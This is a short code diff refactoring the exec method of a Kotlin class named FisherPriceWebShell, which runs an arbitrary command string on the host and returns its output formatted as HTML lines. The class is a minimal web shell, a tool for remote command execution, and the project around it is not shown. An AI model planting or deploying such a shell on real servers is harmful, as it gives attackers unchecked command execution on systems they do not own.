@@ -16,18 +16,19 @@ class FisherPriceWebShell() {
     }
 
     fun exec(cmd: String): String {
-        var response = "N/A"
-        try {
+        return try {
+            var response = "****************************<br/>"
             val process = RUNTIME.exec(cmd)
             process.waitFor()
-            val bri = BufferedReader(InputStreamReader(process.inputStream))
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
             var line: String? = null
-            while ({ line = bri.readLine(); line }() != null) {
+            while ({ line = reader.readLine(); line }() != null) {
                 response += line!! + "<br/>"
             }
+
+            response
         } catch (e: Exception) {
             "Could not fetch response: " + e.message
         }
-        return response
     }
 }
